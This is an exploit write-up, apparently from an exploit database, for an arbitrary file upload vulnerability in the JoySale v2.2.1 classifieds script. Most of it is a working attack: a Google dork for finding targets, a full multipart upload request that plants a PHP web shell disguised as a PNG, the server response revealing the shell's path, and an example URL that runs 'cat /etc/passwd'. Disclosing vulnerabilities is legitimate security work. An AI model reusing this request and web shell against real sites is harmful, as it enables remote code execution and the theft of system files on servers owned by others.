@@ -1,0 +1,139 @@
+JoySale Arbitrary File Upload
+
+# Exploit Title: JoySale Arbitrary File Upload
+# Exploit Author: Mutlu Benmutlu
+# Date: 1/08/2017
+# Vendor Homepage: http://www.hitasoft.com/product/joysale-advanced-classifieds-script/
+# Version: Joysale v2.2.1 (latest)
+# Google Dork: "joysale-style.css"
+# Tested on : MacOS Sierra 10.12.5 / Kali Linux
+
+Details
+=======
+
+Vendor informed about vulnerability, they are going to release fix. Joysale v2.2.1 (latest version) vulnerable to attack.
+While uploading image file, you can change the content in it, there is only user controls for file type.
+After you post vulnerable code via file upload, server saves your file in temp folder
+
+========================================
+Vulnerable Page:
+========================================
+ 
+http://xxxxxxxxx.com/products/create 
+
+========================================
+Vulnerable POST REQUEST:
+========================================
+
+POST /item/products/upload/QZP83N70 HTTP/1.1
+Host: xxxxxxxxx.com
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+X-Requested-With: XMLHttpRequest
+Referer: https://xxxxxxxxx.com/products/create
+Content-Length: 2054
+Content-Type: multipart/form-data; boundary=---------------------------1321235123106179646780168
+Cookie: PHPSESSID=b6ah8xxxxxxx9k4pqvr4; useridval=user%40mailaddress.com
+Connection: close
+
+-----------------------------1321235045961106179646780168
+Content-Disposition: form-data; name="XUploadForm[file]"
+
+
+-----------------------------1321235045961106179646780168
+Content-Disposition: form-data; name="Products[category]"
+
+
+-----------------------------1321235045961106179646780168
+Content-Disposition: form-data; name="Products[subCategory]"
+
+
+-----------------------------1321235045961106179646780168
+Content-Disposition: form-data; name="Products[name]"
+
+
+-----------------------------1321235045961106179646780168
+Content-Disposition: form-data; name="Products[description]"
+
+
+-----------------------------1321235045961106179646780168
+Content-Disposition: form-data; name="Products[price]"
+
+
+-----------------------------1321235045961106179646780168
+Content-Disposition: form-data; name="Products[currency]"
+
+â‚¬-EUR
+-----------------------------1321235045961106179646780168
+Content-Disposition: form-data; name="Products[location]"
+
+ 28108 Alcobendas, Spain
+-----------------------------1321235045961106179646780168
+Content-Disposition: form-data; name="Products[latitude]"
+
+40.534915100000006
+-----------------------------1321235045961106179646780168
+Content-Disposition: form-data; name="Products[longitude]"
+
+-3.616368599999987
+-----------------------------1321235045961106179646780168
+Content-Disposition: form-data; name="facebook_share"
+
+1
+-----------------------------1321235045961106179646780168
+Content-Disposition: form-data; name="Products[promotion][type]"
+
+
+-----------------------------1321235045961106179646780168
+Content-Disposition: form-data; name="Products[promotion][addtype]"
+
+
+-----------------------------1321235045961106179646780168
+Content-Disposition: form-data; name="Products[uploadSessionId]"
+
+QZP83N70
+-----------------------------1321235045961106179646780168
+Content-Disposition: form-data; name="XUploadForm[file]"; filename="ab.php"
+Content-Type: image/png
+
+<?php echo shell_exec($_GET[‘e’]); ?>
+
+-----------------------------1321235045961106179646780168--
+
+========================================
+Vulnerable POST RESPONSE:
+========================================
+
+HTTP/1.1 200 OK
+Server: nginx
+Date: Mon, 31 Jul 2017 13:50:18 GMT
+Content-Type: application/json
+Connection: close
+X-Powered-By: PHP/7.0.21
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Vary: Accept
+X-Powered-By: Linux
+MS-Author-Via: DAV
+Cache-Control: max-age=0, private, no-store, no-cache, must-revalidate
+Content-Length: 306
+
+[{"name”:”ab.php","type":"image\/png","size": 306,"url":"\/media\/item\/tmp\/f99aaeasde51c890402b0fda9408.php","thumbnail_url":"\/media\/item\/tmp\/\/f99aaeasde51c890402b0fda9408.php","delete_url":"\/products\/upload?_method=delete&file= f99aaeasde51c890402b0fda9408.php","delete_type":"POST"}]
+
+========================================
+Vulnerable UPLOADED FILE PATH
+========================================
+
+http://xxxxxxxxx.com/media/item/tmp/f99aaeasde51c890402b0fda9408.php
+
+========================================
+Vulnerable Code Execution (example)
+========================================
+
+http://xxxxxxxxx.com/media/item/tmp/f99aaeasde51c890402b0fda9408.php?e=cat+/etc/passwd
+
+
+Enjoy.
+Mutlu Benmutlu
